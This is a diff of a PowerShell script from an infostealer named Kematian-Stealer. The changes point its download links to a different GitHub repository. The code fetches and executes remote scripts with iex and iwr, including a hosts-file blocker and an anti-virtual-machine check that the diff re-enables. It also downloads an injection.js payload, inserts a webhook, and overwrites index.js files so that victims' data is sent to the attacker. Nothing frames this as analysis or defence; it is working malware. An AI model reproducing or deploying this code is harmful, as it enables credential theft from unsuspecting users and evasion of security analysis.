@@ -101,16 +101,16 @@ function Invoke-TASKS {
         Write-Host "[!] Task Created" -ForegroundColor Green
     }
     if ($blockhostsfile) {
-        $link = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1"
+        $link = "https://raw.githubusercontent.com/messecv3/main/main/blockhosts.ps1"
         iex (iwr -Uri $link -UseBasicParsing)
     }
     Backup-Data
 }
 
 function VMPROTECT {
-    #$link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
-    #ex (iwr -uri $link -useb)
-    #Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT !" -ForegroundColor Green
+    $link = ("https://raw.githubusercontent.com/messecv3/main/main/antivm.ps1")
+    ex (iwr -uri $link -useb)
+    Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT !" -ForegroundColor Green
 }
 
 
@@ -788,7 +788,7 @@ Pass: $decodedPass
                 foreach ($file in $files) {
                     if ($file.Name -eq "index.js") {
                         $webClient = New-Object System.Net.WebClient
-                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/injection.js")
+                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/messecv3/main/main/injection.js")
                         if ($content -ne "") {
                             $replacedContent = $content -replace "%WEBHOOK%", $webhook
                             $replacedContent | Set-Content -Path $file.FullName -Force
